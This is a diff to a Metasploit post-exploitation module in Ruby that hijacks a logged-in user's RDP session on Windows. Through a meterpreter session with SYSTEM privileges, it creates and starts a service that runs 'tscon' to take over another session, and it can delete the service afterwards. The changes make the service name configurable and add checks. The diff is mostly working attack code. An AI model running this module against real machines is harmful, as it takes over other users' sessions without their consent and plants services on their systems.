@@ -33,6 +33,7 @@
 # The session number to run this module on  => set SESSION 3
 # Check available IDs in target system      => set CHECK_ID true
 # The Session ID to be hijacked (eg 1)      => set HIJACK_ID 1
+# The service name to be created            => set SERVICE_NAME myservice
 # Delete malicious service created?         => set DEL_SERVICE true
 #
 #
@@ -56,7 +57,7 @@
 # [ HINT ]
 # In some linux distributions postgresql needs to be started and
 # metasploit database deleted/rebuild to be abble to load module.
-# 1 - /etc/init.d/postgresql start
+# 1 - service postgresql start
 # 2 - msfdb delete (optional)
 # 3 - msfdb init   (optional)
 # 4 - msfconsole
@@ -82,7 +83,7 @@ require 'msf/core/post/windows/registry'
 # Metasploit Class name and includes
 # ----------------------------------
 class MetasploitModule < Msf::Post
-      Rank = ExcellentRanking
+      Rank = GreatRanking
 
          include Msf::Post::Common
          include Msf::Post::Windows::Priv
@@ -108,7 +109,7 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover: korznikov',                   # vuln discover credits
                                 ],
  
-                        'Version'        => '$Revision: 1.1',
+                        'Version'        => '$Revision: 1.2',
                         'DisclosureDate' => 'mar 21 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -131,6 +132,7 @@ class MetasploitModule < Msf::Post
 				{
                                          'SESSION' => '1',     # Default its to run againts session 1
                                          'HIJACK_ID' => '1',   # Default its to run againts user id 1
+                                         'SERVICE_NAME' => 'sesshijack', # Default its to create sesshijack service
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -145,6 +147,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
+                                OptString.new('SERVICE_NAME', [ true, 'The service name to be created (eg myservice)']),
                                 OptBool.new('DEL_SERVICE', [ false, 'Delete malicious service created?' , false])
                         ], self.class) 
 
@@ -159,23 +162,27 @@ class MetasploitModule < Msf::Post
 # --------------------------
 def ls_stage1
 
-session = client
-com_query = "query user"
-# check for proper config settings enter
-# to prevent 'unset all' from deleting default options...
-if datastore['CHECK_ID'] == 'nil'
-  print_error("Options not configurated correctly...")
-  print_warning("Please set CHECK_ID option!")
-  return nil
-else
-  print_status("Reporting logged users ids available!")
-  Rex::sleep(1.5)
-end
-
   r=''
-  print_line("")
-  # querying target logged users ids
-  r = session.sys.process.execute("cmd.exe /c #{com_query}", nil, {'Hidden' => true, 'Channelized' => true})
+  session = client
+  com_query = "query user" # net user 
+  # check for proper config settings enter
+  # to prevent 'unset all' from deleting default options...
+  if datastore['CHECK_ID'] == 'nil'
+    print_error("Options not configurated correctly ..")
+    print_warning("Please set CHECK_ID option!")
+    return nil
+  else
+    print_status("Reporting logged users ids available!")
+    Rex::sleep(1.5)
+  end
+
+    #
+    # querying remote target logged users ids (cmd.exe)
+    #
+    print_good("  exec => cmd.exe /c #{com_query} ..")
+    Rex::sleep(1.0)
+    print_line("")
+    r = session.sys.process.execute("cmd.exe /c #{com_query}", nil, {'Hidden' => true, 'Channelized' => true})
 
     # close channel when done
     print_line("")
@@ -198,15 +205,16 @@ def ls_stage2
 
   r=''
   session = client
-  com_useid = datastore['HIJACK_ID'] # user id to be hijacked
-  com_start = "net start sesshijack" # start malicious service
+  com_useid = datastore['HIJACK_ID']    # user id to be hijacked
+  com_servi = datastore['SERVICE_NAME'] # service name to be created
+  com_start = "net start #{com_servi}"  # start remote malicious service
   com_comps = "%systemdrive%\\system32\\cmd.exe" # cmd.exe compspec path
-  com_execs = "sc create sesshijack binpath= \"#{com_comps} /k tscon #{com_useid} /dest:rdp-tcp#55\"" # create service
+  com_execs = "sc create #{com_servi} binpath= \"#{com_comps} /k tscon #{com_useid} /dest:rdp-tcp#55\"" # create service
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
-  if datastore['HIJACK_ID'] == 'nil'
-    print_error("Options not configurated correctly...")
-    print_warning("Please set HIJACK_ID option!")
+  if datastore['HIJACK_ID'] == 'nil' || datastore['SERVICE_NAME'] == 'nil'
+    print_error("Options not configurated correctly ..")
+    print_warning("Please set HIJACK_ID | SERVICE_NAME options!")
     return nil
   else
     print_status("Hijacking RDP process!")
@@ -217,11 +225,11 @@ def ls_stage2
     # TODO: check rdp service name in taskmanager
     # Search in target if service its active
     #
-    print_warning("Searching for RDP service existence ..")
+    print_warning("Searching RDP service existence ..")
     Rex::sleep(1.0)
     session.sys.process.get_processes().each do |x|
       if x['name'].downcase == "rdp.exe"
-        print_good("process RDP found running ..")
+        print_good("  exec => process RDP found running ..")
         Rex::sleep(1.0)
       else
         # service not found running in target system
@@ -231,25 +239,28 @@ def ls_stage2
         Rex::sleep(1.0)
         return nil
       end
+    end
 
- #
- # Execute process hijacking in registry
- # sc create sesshijack binpath= "%systemdrive%\system32\cmd.exe /k tscon 1 /dest:rdp-tcp#55
- #
- print_good(" exec => Creating service to gain code execution...")
- r = session.sys.process.execute("cmd.exe /c #{com_execs}", nil, {'Hidden' => true, 'Channelized' => true})
- print_good(" exec => #{com_execs}")
- # give a proper time to refresh regedit 'enigma0x3' :D
- Rex::sleep(4.5)
+    #
+    # Execute process hijacking in registry
+    # sc create sesshijack binpath= "%systemdrive%\system32\cmd.exe /k tscon 1 /dest:rdp-tcp#55"
+    #
+    print_good("  exec => Creating service to gain code execution ..")
+    Rex::sleep(1.0)
+    print_good("  exec => #{com_execs}")
+    r = session.sys.process.execute("cmd.exe /c #{com_execs}", nil, {'Hidden' => true, 'Channelized' => true})
+    # give a proper time to refresh regedit 'enigma0x3' :D
+    Rex::sleep(4.5)
 
       # start remote service to gain code execution
-      print_good(" exec => Starting sesshijack service ..")
-      r = session.sys.process.execute("cmd.exe /c #{com_start}", nil, {'Hidden' => true, 'Channelized' => true})
+      print_good("  exec => Starting #{com_servi} service ..")
       Rex::sleep(1.0)
+      r = session.sys.process.execute("cmd.exe /c #{com_start}", nil, {'Hidden' => true, 'Channelized' => true})
 
     # close channel when done
     print_status("Session hijack Credits: @korznikov")
     print_line("")
+    Rex::sleep(1.0)
     r.channel.close
     r.close
 
@@ -268,21 +279,50 @@ def ls_stage3
 
   r=''
   session = client
-  com_delet = "sc delete sesshijack" # malicious service to delete
+  com_servi = datastore['SERVICE_NAME'] # myservice
+  com_delet = "sc delete #{com_servi}"  # malicious service to delete
+  hklm = "HKLM\\System\\CurrentControlSet\\services\\#{com_servi}" # malicious service hive key
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
-  if datastore['DEL_SERVICE'] == 'nil'
+  if datastore['DEL_SERVICE'] == 'nil' || datastore['SERVICE_NAME'] == 'nil'
     print_error("Options not configurated correctly...")
-    print_warning("Please set DEL_SERVICE option!")
+    print_warning("Please set DEL_SERVICE | SERVICE_NAME options!")
     return nil
   else
-    print_status("Delete malicious sesshijack service!")
+    print_status("Deleting malicious #{com_servi} service!")
     Rex::sleep(1.5)
   end
 
-  print_line("")
-  # delete malicious service on target
-  r = session.sys.process.execute("cmd.exe /c #{com_delet}", nil, {'Hidden' => true, 'Channelized' => true})
+    #
+    # TODO: check if it writes in HKLM or HKCU
+    # search in target regedit for service existence ..
+    #
+    print_warning("Reading service hive registry keys ..")
+    sleep(1.0)
+    if registry_enumkeys("HKLM\\System\\CurrentControlSet\\services\\#{com_servi}")
+      print_good("  exec => Remote service: #{com_servi} found ..")
+      sleep(1.0)
+    else
+      print_error("[ ABORT ]: post-module cant find #{com_servi} in regedit ..")
+      print_warning("Enter into a shell session and execute: sc qc #{com_servi}")
+      print_line("")
+      print_line("")
+      # display remote service current settings...
+      # cloning SC qc <ServiceName> display outputs...  
+      print_line("SERVICE_NAME: #{com_servi}")
+      print_line(" [SC] Query Service Failed 404: NOT FOUND ..")
+      print_line("")
+      print_line("")
+    return nil
+    end
+
+      #
+      # delete malicious service on target (cmd.exe)
+      #
+      print_good("  exec => #{com_delet}")
+      Rex::sleep(1.0)
+      r = session.sys.process.execute("cmd.exe /c #{com_delet}", nil, {'Hidden' => true, 'Channelized' => true})
+      print_status("Service #{com_servi} successfully deleted ..")
 
     # close channel when done
     print_line("")
@@ -335,15 +375,19 @@ def run
     # the 'def check()' funtion that rapid7 requires to accept new modules.
     # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
-    # check if we are running againts a priviliged session 
-    if not runtor == "NT AUTHORITY/SYSTEM"
-      print_error("[ ABORT ]: This module only works in a priviliged session")
-      print_warning("This module requires NT AUTHORITY/SYSTEM privs to run")
-      return nil
-    end
     # check for proper operative system (windows-not-wine)
     if not oscheck == "Windows_NT"
-      print_error("[ ABORT ]: This module only works againts windows systems")
+      print_error("[ ABORT ]: Non-Compatible system found ..")
+      print_warning("This module only works againts windows systems")
+      return nil
+    end
+    #
+    # TODO: check if this works..
+    # check for proper operative system (Windows 2008|2012|7|10)
+    #
+    if not sysinfo['OS'] =~ /Windows (2008|2012|7|10)/
+      print_error("[ ABORT ]: Non-Compatible system found ..")
+      print_warning("Vulnerable systems: Windows 2008|2012|7|10")
       return nil
     end
     # check for proper session (meterpreter)
@@ -352,7 +396,16 @@ def run
     if not sysinfo.nil?
       print_status("Running module against: #{sysnfo['Computer']}")
     else
-      print_error("[ ABORT ]: This module only works against meterpreter sessions!")
+      print_error("[ ABORT ]: This module requires a meterpreter session ..")
+      return nil
+    end
+    #
+    # TODO: check if this works..
+    # check if we are running againts a priviliged session
+    #
+    if not runtor == "NT AUTHORITY/SYSTEM"
+      print_error("[ ABORT ]: This module requires a priviliged session ..")
+      print_warning("This module requires NT AUTHORITY/SYSTEM privs to run")
       return nil
     end
     # elevate session privileges befor runing options
